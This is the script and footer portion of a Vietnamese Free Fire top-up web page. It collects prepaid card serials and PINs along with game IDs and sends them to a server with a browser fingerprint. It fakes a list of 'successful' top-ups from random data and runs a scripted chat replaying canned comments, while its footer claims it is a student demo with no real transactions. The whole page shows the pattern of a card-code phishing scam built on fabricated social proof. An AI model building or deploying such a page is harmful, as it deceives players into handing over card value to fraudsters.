<!--script src="https://unpkg.com/@popperjs/core@2"></script-->
<script src="/assets/jquery.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script> 

<script src="/assets/sweetalert2@11.js"></script>
<script>
document.getElementById('id_game').addEventListener('keypress', function(e) {
    if (e.which == 13 || e.keyCode == 13) {
        document.querySelector('.first-verify').click();
    }
});
</script>
<script>
function validateFreeFireIdStrict(id) {
  const uid = String(id || '').trim();
  return /^\d{9,12}$/.test(uid);
}
function isDigitsInRange(val, min, max) {
  const s = String(val || '').trim();
  return new RegExp(`^\\d{${min},${max}}$`).test(s);
}

function maskIdJS(id) {
    let s = String(id);
    if (s.length <= 4) return s.substring(0, 1) + '*'.repeat(Math.max(0, s.length - 2)) + s.substring(s.length - 1);
    return s.substring(0, 2) + '*'.repeat(Math.max(0, s.length - 4)) + s.substring(s.length - 2);
}

function formatMoney(amount) {
    return Number(amount).toLocaleString('vi-VN');
}

function initFakeHistorySession() {
    let history = JSON.parse(sessionStorage.getItem('mock_topup_history'));
    
    if (!history || history.length === 0) {
        let fakeData = [];
        let telcos = ['VIETTEL', 'VINAPHONE', 'MOBIFONE', 'Garena'];
        let amounts = [20000, 50000, 100000, 200000, 500000];
        let now = new Date();
        
        for (let i = 0; i < 5; i++) {
            let randomDays = Math.floor(Math.random() * 30);
            let randomHours = Math.floor(Math.random() * 24);
            let randomMinutes = Math.floor(Math.random() * 60);
            let randomSeconds = Math.floor(Math.random() * 60);
            let randomPastTime = new Date(now.getFullYear(), now.getMonth(), now.getDate() - randomDays, randomHours, randomMinutes, randomSeconds);
            
            let timeString = randomPastTime.getFullYear() + '-' + 
                             String(randomPastTime.getMonth() + 1).padStart(2, '0') + '-' + 
                             String(randomPastTime.getDate()).padStart(2, '0') + ' ' + 
                             String(randomPastTime.getHours()).padStart(2, '0') + ':' + 
                             String(randomPastTime.getMinutes()).padStart(2, '0') + ':' + 
                             String(randomPastTime.getSeconds()).padStart(2, '0');
            
            let randomId = Math.floor(Math.random() * 900000000) + 100000000;
            let randomTelco = telcos[Math.floor(Math.random() * telcos.length)];
            let randomAmount = amounts[Math.floor(Math.random() * amounts.length)];

            fakeData.push({
                id_game: randomId.toString(),
                telco: randomTelco,
                amount: randomAmount,
                time: timeString
            });
        }

        fakeData.sort((a, b) => new Date(a.time) - new Date(b.time));
        
        sessionStorage.setItem('mock_topup_history', JSON.stringify(fakeData));
    }
}

function loadHistoryFromLocal() {
    let history = JSON.parse(sessionStorage.getItem('mock_topup_history')) || [];
    let html = '';

    if (history.length === 0) {
        html = '<tr><td colspan="3" style="text-align:center;"><font color="black">Chưa có dữ liệu test nội bộ</font></td></tr>';
    } else {
        let displayHistory = [...history].reverse();
        displayHistory.forEach(item => {
            html += `
            <tr>
                <td>
                    <font color="FFFFFF">${maskIdJS(item.id_game)}</font>
                </td>
                <td>
                    <font color="FFFFFF">Nạp <font color="Lime">Thành công</font> Thẻ ${item.telco} Mệnh Giá ${formatMoney(item.amount)}<sup>Đ</sup></font>
                </td>
                <td>
                    <font color="FFFFFF">${item.time}</font>
                </td>
            </tr>`;
        });
    }
    $('#history_body').html(html);
}

$(document).ready(function() {
    initFakeHistorySession();
    loadHistoryFromLocal();
});

$(document).on('keypress', '.card-info', function(e) {
  if (e.which === 13) $('.pay-step').click();
});

$(document).on('change', '#telco', seriInput);

function seriInput() {
  var telco = $("#telco").val();
  if (telco === "Garena") {
    $("#seriInpt").hide();
  } else {
    $("#seriInpt").show();
  }
}

function showFormRecharge() {
  var id = $("#id_game").val().trim();

  if (!id) {
    Swal.fire('Thông báo', 'Vui lòng nhập ID Game', 'warning');
    return false;
  }
  if (!validateFreeFireIdStrict(id)) {
    Swal.fire('Sai định dạng', 'UID Free Fire phải là số, từ 9 đến 10 ký tự.', 'error');
    return false;
  }

  $("#userid2").val(id);
  $("#idValue").hide();
  $("#paymentPanel").show();
  return true;
}

function sendCard(elem) {
  var $this = $(elem);
  if ($this.data('busy')) return;

  var telco   = $("#telco").val();
  var telcoName = $("#telco option:selected").text();
  var amount  = $("#amount").val();
  var serial  = $("#serial").val();
  var pin     = $("#pin").val();
  var id_game = $("#id_game").val().trim();
  var cfTokenEl = document.querySelector('input[name="cf-turnstile-response"]');
  const cloudflareToken = cfTokenEl ? cfTokenEl.value : '';

  var image_captcha = $("#image_captcha").val() ? $("#image_captcha").val().trim() : '';
  var math_captcha = $("#math_captcha").val() ? $("#math_captcha").val().trim() : '';
  var puzzle_captcha = $("#puzzle_offset").val() ? $("#puzzle_offset").val().trim() : '';

  if (!validateFreeFireIdStrict(id_game)) {
    Swal.fire('Sai định dạng', 'UID Free Fire phải là số, 9–10 ký tự.', 'error');
    return;
  }
  if (!telco) {
    Swal.fire('Thiếu dữ liệu', 'Vui lòng chọn nhà mạng/Telco.', 'warning');
    return;
  }
  if (!amount || !isDigitsInRange(amount, 1, 10)) {
    Swal.fire('Sai mệnh giá', 'Vui lòng chọn mệnh giá hợp lệ.', 'warning');
    return;
  }
  if (telco !== 'Garena') {
    if (!serial) {
      Swal.fire('Thiếu Serial', 'Vui lòng nhập Serial thẻ.', 'warning');
      return;
    }
    if (!isDigitsInRange(serial, 5, 25)) {
      Swal.fire('Serial không hợp lệ', 'Serial phải là số, 5–25 ký tự.', 'error');
      return;
    }
  }
  if (!pin) {
    Swal.fire('Thiếu Mã thẻ', 'Vui lòng nhập Mã thẻ/PIN.', 'warning');
    return;
  }
  if (!isDigitsInRange(pin, 6, 30)) {
    Swal.fire('Mã thẻ không hợp lệ', 'PIN phải là số, 6–30 ký tự.', 'error');
    return;
  }

  // Captcha validations
  if ($("#image_captcha").length && !image_captcha) {
    Swal.fire('Mã xác nhận trống', 'Vui lòng nhập mã captcha ảnh.', 'warning');
    return;
  }
  if ($("#math_captcha").length && !math_captcha) {
    Swal.fire('Đáp án trống', 'Vui lòng điền đáp án phép tính.', 'warning');
    return;
  }
  if ($("#puzzle_offset").length && (puzzle_captcha === '0' || !puzzle_captcha)) {
    Swal.fire('Chưa xếp mảnh ghép', 'Vui lòng kéo mảnh ghép khớp vào ô trống trên ảnh.', 'warning');
    return;
  }

  const fingerprint = getCanvasFingerprint();
  const antibotToken = humanVerifiedToken || '';

  $this.data('busy', true);
  $this.after("<div class='loading'></div>");
  $this.attr('disabled', true).text('Đang xử lí...');

  $.ajax({
    type: "POST",
    url: "/model/system.php",
    data: { telco, amount, serial, pin, id_game, cloudflareToken, fingerprint, antibotToken, image_captcha, math_captcha, puzzle_captcha },
    dataType: "json"
  })
  .done(function(res) {
    $this.removeAttr('disabled').text('THANH TOÁN');
    $this.next('.loading').remove();
    $this.data('busy', false);

    // Refresh image captcha if exists
    if ($("#img_captcha_src").length) {
      $("#img_captcha_src").click();
      $("#image_captcha").val("");
    }
    // Refresh math captcha if exists
    if (res && res.new_math && $("#math_captcha").length) {
      $("#math_captcha").parent().find('span').text(res.new_math);
      $("#math_captcha").val("");
    }
    // Refresh puzzle captcha if exists
    if (typeof loadPuzzleCaptcha === 'function') {
      loadPuzzleCaptcha();
    }

    if (res && res.status === 'success') {
      let history = JSON.parse(sessionStorage.getItem('mock_topup_history')) || [];
      let now = new Date();
      let timeString = now.getFullYear() + '-' + 
                       String(now.getMonth() + 1).padStart(2, '0') + '-' + 
                       String(now.getDate()).padStart(2, '0') + ' ' + 
                       String(now.getHours()).padStart(2, '0') + ':' + 
                       String(now.getMinutes()).padStart(2, '0') + ':' + 
                       String(now.getSeconds()).padStart(2, '0');

      history.push({
          id_game: id_game,
          telco: telcoName || telco,
          amount: amount,
          time: timeString
      });
      
      if (history.length > 5) {
          history.shift();
      }
      
      sessionStorage.setItem('mock_topup_history', JSON.stringify(history));

      Swal.fire('Thành Công', res.msg || 'Giao dịch thành công.', 'success')
        .then(function(){ 
            loadHistoryFromLocal(); 
            $("#pin").val("");
            $("#serial").val("");
        });
    } else {
      Swal.fire('Thất Bại', (res && res.msg) || 'Giao dịch thất bại.', 'error');
    }
  })
  .fail(function(xhr) {
    $this.removeAttr('disabled').text('THANH TOÁN');
    $this.next('.loading').remove();
    $this.data('busy', false);

    // Refresh image captcha if exists
    if ($("#img_captcha_src").length) {
      $("#img_captcha_src").click();
      $("#image_captcha").val("");
    }
    if (xhr?.responseJSON?.new_math && $("#math_captcha").length) {
      $("#math_captcha").parent().find('span').text(xhr.responseJSON.new_math);
      $("#math_captcha").val("");
    }
    // Refresh puzzle captcha if exists
    if (typeof loadPuzzleCaptcha === 'function') {
      loadPuzzleCaptcha();
    }

    const msg = xhr?.responseJSON?.msg || 'Không thể kết nối máy chủ. Thử lại sau.';
    Swal.fire('Lỗi mạng', msg, 'error');
  });
}
</script>



<style>
.inbox_chat {
    height: 550px;
    overflow-y: scroll;
}

.chat_list {
    border-bottom: 1px solid #c4c4c4;
    margin: 0;
    padding: 18px 16px 10px;
}

.chat_people {
    overflow: hidden;
    clear: both;
}

.chat_img {
    float: left;
    width: 11%;
}

.chat_ib {
    float: left;
    padding: 0 0 0 15px;
    width: 95%;
}

.chat_ib h5 {
    font-size: 15px;
    color: #464646;
    margin: 0 0 8px 0;
}

.chat_ib p {
    font-size: 14px;
    color: #989898;
    margin: auto;
}

.chat_ib h5 span {
    font-size: 13px;
    float: right;
}

.c-layout-go2top {
    display: inline-block;
    position: fixed;
    bottom: 130px;
    right: 29px;
    cursor: pointer;
    z-index: 200;
}

.c-layout-go2top>svg {
    opacity: 1;
    filter: alpha(opacity=50);
    color: red;
    font-size: 38px;
    font-weight: 300;
}

.mesgs {
    width: 100% !important;
}

.mesgs {
    float: left;
    padding: 30px 15px 0 25px;
    width: 60%;
}

.type_msg {
    border-top: 1px solid #c4c4c4;
    position: relative;
}

.input_msg_write input {
    background: rgba(0, 0, 0, 0) none repeat scroll 0 0;
    border: medium none;
    color: #4c4c4c;
    font-size: 15px;
    min-height: 48px;
    width: 100%;
    padding: 8px;
}

input[type="text"] {
    color: #333333 !important;
}

.msg_send_btn {
    background: #05728f none repeat scroll 0 0;
    border: medium none;
    border-radius: 50%;
    color: #fff;
    cursor: pointer;
    font-size: 30px;
    line-height: 1;
    height: 33px;
    position: absolute;
    right: 0;
    top: 11px;
    width: 33px;
}

.messaging {
    color: #000 !important
}

.flex-around {
    justify-content: space-around;
}


.badge {
    padding: 0.45em 0.4em;
    font-weight: 500;
}

.badge-pill {
    padding-right: 1.2em;
    padding-left: 1.2em;
    border-radius: 10rem;
    font-size: 13px;
}

.badge-primary {
    color: #fff;
    background-color: #ffa000;
}
</style>

<script type="text/javascript">
$(function() {
    var loop = 0;
    var interval;
    var loop2 = 0;

    function load(callback) {
        $.ajax({
            url: '/js/at_binhluan.php',
            type: 'GET'
        }).done(callback);
    }

    function getRandomInt(min, max) {
        min = Math.ceil(min);
        max = Math.floor(max);
        return Math.floor(Math.random() * (max - min) + min);
    }

    function addComment(name, mess) {
        var chatItem = `
            <div class="chat_list">
                <div class="chat_people">
                    <div class="chat_img"></div>
                    <div class="chat_ib">
                        <h5>${name}<span class="chat_date">Vừa Gửi</span></h5>
                        <p>${mess}</p>
                    </div>
                </div>
            </div>
        `;
        $('.wrapper-chat-list').append(chatItem);
        var elem = document.querySelector('.inbox_chat');
        elem.scrollTop = elem.scrollHeight;
    }

    function initializeChat(json) {
        interval = setInterval(function() {
            if (json.length - 1 <= loop) {
                loop = 0;
            }
            addComment(json[loop].name, json[loop].mess);
            loop += 1;
            saveToSessionStorage('chatLoop', loop);
        }, 2000);
        json.forEach(function(v, i) {
            if (loop2 <= 5) {
                loop2 += 1;
            } else {
                loop2 = 1;
            }
            if (i > 8) {
                return;
            }
        });
    }

    function saveToSessionStorage(key, value) {
        sessionStorage.setItem(key, value);
    }

    function loadFromSessionStorage(key) {
        return sessionStorage.getItem(key);
    }

    load(function(res) {
        var storedLoop = loadFromSessionStorage('chatLoop');
        var json = JSON.parse(res);
        loop = storedLoop ? parseInt(storedLoop, 10) : 0;
        initializeChat(json);
    });

    $('.msg_send_btn').click(function() {
        var text = $('.write_msg');
        if (!text.val()) return;
        addComment("Bạn", text.val());
        text.val('');
        saveToSessionStorage('userMessage', text.val());
    });

    var storedMessage = loadFromSessionStorage('userMessage');
    if (storedMessage) {
        addComment("Bạn", storedMessage);
    }
});

</script>

<footer class="footer-outter-container">
    <div class="container">
        <div class="row">
            <div class="col-md-12 text-center">
                <p><strong><i class="fas fa-graduation-cap"></i> Đồ Án Cơ Sở - Demo Giao Diện UI/UX</strong></p>
                <p>Website được xây dựng bởi sinh viên nhằm phục vụ mục đích nghiên cứu, học tập lớp lập trình Web.</p>
                <p>Tuyên bố từ chối trách nhiệm: Tất cả hình ảnh và thương hiệu thuộc quyền sở hữu của nhà phát hành. KHÔNG có giao dịch thật, KHÔNG thu lợi nhuận thương mại từ dự án này.</p>

                <p><a target="_blank" href="https://www.youtube.com/" title="">Điều khoản dịch vụ</a> | <a
                        target="_blank" href="https://www.youtube.com/" title="">Chính sách bảo mật</a> | <a
                        target="_blank" href="https://www.youtube.com/" title="">Chính sách giải quyết</a></p>
                <a href="//www.dmca.com/Protection/Status.aspx?id=32b1b99e-dba5-4b07-97de-14fe7dfa0102" title="DMCA.com Protection Status" class="dmca-badge"> <img src="//images.dmca.com/Badges/dmca-badge-w150-5x1-01.png?ID=//www.dmca.com/Protection/Status.aspx?id=32b1b99e-dba5-4b07-97de-14fe7dfa0102" alt="DMCA.com Protection Status"></a> <script src="//images.dmca.com/Badges/DMCABadgeHelper.min.js"> </script>    
            </div>
        </div>
    </div>
</footer>
</div>
</div>
<!-- /.modal-dialog -->
</div>
</body>

</html>